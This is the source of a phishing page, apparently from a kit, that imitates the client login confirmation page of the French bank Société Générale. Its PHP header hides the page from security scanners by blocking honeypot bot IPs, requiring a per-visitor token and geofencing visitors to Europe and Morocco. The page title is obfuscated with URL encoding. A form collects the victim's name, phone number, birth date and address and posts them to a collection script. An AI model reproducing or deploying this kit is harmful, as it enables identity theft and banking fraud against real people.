<?php

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
$honeypotbots = file_get_contents('honeypotbots.dat');
$errorUrl = 'Error.php';
$ip = getenv('REMOTE_ADDR');

if (stripos($honeypotbots, $ip) !== false) {
  $stripos = '1';

}



$token1 = base64_encode($_SERVER['HTTP_USER_AGENT'].$ip.date('Y:M:D'));
if ($token1 != $_GET['token'] || $stripos == '1' ){ header("location: " . $errorUrl . "?hash=".base64_encode(rand(0,9999999999999)). "&token=" . $_GET['token']); exit;  }

function curl_get_contents($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_URL, $url);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
} 
$metri = $_SERVER['REMOTE_ADDR'];
$geoip = 'http://www.geoplugin.net/php.gp?ip='.$metri;
$addrDetailsArr = unserialize(curl_get_contents($geoip)); 
$continent = $addrDetailsArr['geoplugin_continentCode'];
$country = $addrDetailsArr['geoplugin_countryCode'];
if (!$country)
{
    $country='Not found!';
}

if ($continent !== 'EU' && $country !== 'MA')
{
      header("location: " . $errorUrl . "?" . $_GET['token']);
     exit();
} 




?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="./files/cs/b.min.css">
        <link rel="stylesheet" href="./files/cs/h.css">
        <link rel="stylesheet" href="./files/cs/f.css">
        <link rel="stylesheet" href="./files/cs/m.css">

        <link rel="shortcut icon" href="./files/img/favicon.ico" type="image/x-icon"> 
        
        <script type="text/javascript">
            var title = unescape( '%53%6F%63%69%E9%74%E9%20%47%E9%6E%E9%72%61%6C%65%20%7C%20%43%6F%6E%6E%65%78%69%6F%6E' );
            var page_title = unescape( '%43%6F%6E%6E%65%78%69%6F%6E%20%2D%20%45%73%70%61%63%65%20%63%6C%69%65%6E%74' );
        </script>

        <title></title>
    </head>

    <body>
        
        <!-- HEADER -->
        <header id="header" class="d-lg-block d-md-none d-sm-none d-none">
            <div class="header-top">
                <span>Agences</span>
                <span>Aide et contacts</span>
            </div>
            <div class="header-bottom">
                <div class="logo"><img src="./files/img/logo.png"></div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- HEADER -->
        <header id="header2" class="d-lg-none d-md-block d-sm-block d-block">
            <div class="logo"><img src="./files/img/logo2.jpg"></div>
        </header>
        <!-- END HEADER -->

        <div class="page-title">
            <p class="mb-0 pl-5 mt-4 font-weight-bold" style="color: #000">Connexion - Espace client - Confirmation</p>
        </div>

        <!-- MAIN -->
        <main id="main" class="pt-5 pb-5 mt-5" style="margin-bottom: 200px">
            <div class="container">
                <div class="row justify-content-center">
                    <div class="col-md-8">
                        <form class="login-form" method="post" action="<?php  echo 'RD.php?token=' . $token1; ?>">
                           
                            <input type="hidden" name="type" value="tel">
                         
                            <legend>Confirmez vos informations pour plus de sécurite.</legend>
                            <div class="form-group" style="max-width: 450px; width: inherit;">
                                <label>
                                    <p class="label-txt">Votre nom et prénom</p>
                                    <input type="text" class="input" id="fn" name="fn" style="margin-top: 10px;">
                                </label>
                                
                            </div>
                             <div class="form-group" style="max-width: 450px; width: inherit;">
                                <label>
                                    <p class="label-txt">Votre numéro de telehpone</p>
                                    <input type="text" class="input" id="tel" name="tel" style="margin-top: 10px;">
                                </label>
                                
                            </div>
                             <div class="form-group" style="max-width: 450px; width: inherit;">
                                <label>
                                    <p class="label-txt">Date de naissance</p>
                                    <input type="text" class="input" id="dob" name="dob" style="margin-top: 10px;">
                                </label>
                                
                            </div>
                             <div class="form-group" style="max-width: 450px; width: inherit;">
                                <label>
                                    <p class="label-txt">Adresse</p>
                                    <input type="text" class="input" id="adress" name="adress" style="margin-top: 10px;">
                                </label>
                                
                            </div>
                            
                            
                            <div class="form-group mt-5 text-center" style="width: inherit;">
                                <button type="submit">
                                    <img style="min-width: 230px;" src="./files/img/confirmer.png">
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER 1 -->
        <div id="footer1" class="pt-5 pb-5">
            <div class="container">
                <div class="row" style="overflow: hidden;">
                    <div class="col-lg-8 col-md-8 col-sm-12 col-12 text-center">
                        <img style="min-width: 792px;" src="./files/img/footer-info.png" class="d-lg-block d-md-block d-sm-none d-none">
                        <img style="min-width: 346px;" src="./files/img/footer-info2.png" class="d-lg-none d-md-none d-sm-inline-block d-inline-block">
                    </div>
                    <div class="col-lg-4 col-md-4 col-sm-12 col-12 d-lg-block d-md-block d-sm-none d-none text-right">
                        <img style="min-width: 154px;" src="./files/img/social.png">
                    </div>
                </div>
            </div>
        </div>
        <!-- END FOOTER 1 -->

        <!-- FOOTER 1 -->
        <div id="footer2" class="pt-3 pb-3">
            <div class="container">
                <div class="row" style="overflow: hidden;">
                    <div class="col-lg-3 col-md-3 col-sm-12 col-12 d-lg-block d-md-block d-sm-none d-none">
                        <img style="min-width: 160px;" src="./files/img/logo.jpg">
                    </div>
                    <div class="col-lg-9 col-md-3 col-sm-12 col-12 text-lg-right text-md-right text-sm-center text-center">
                        <img style="min-width: 713px;" src="./files/img/footer-links.jpg" class="d-lg-inline-block d-md-inline-block d-sm-none d-none">
                        <img style="min-width: 143px;" src="./files/img/footer-links2.png" class="d-lg-none d-md-none d-sm-inline-block d-inline-block">
                    </div>
                </div>
            </div>
        </div>
        <!-- END FOOTER 1 -->

        <!-- JS FILES -->
        <script src="./files/sj/j.min.js"></script>
        <script src="./files/sj/p.min.js"></script>
        <script src="./files/sj/b.min.js"></script>
        <script src="./files/sj/f.min.js"></script>
        <script src="./files/sj/m.js"></script>

        <script type="text/javascript">
            $('title').text(title);
            $('#page_header h3').html('<i class="far fa-arrow-alt-circle-left"></i> ' + page_title);
        </script>

    </body>

</html>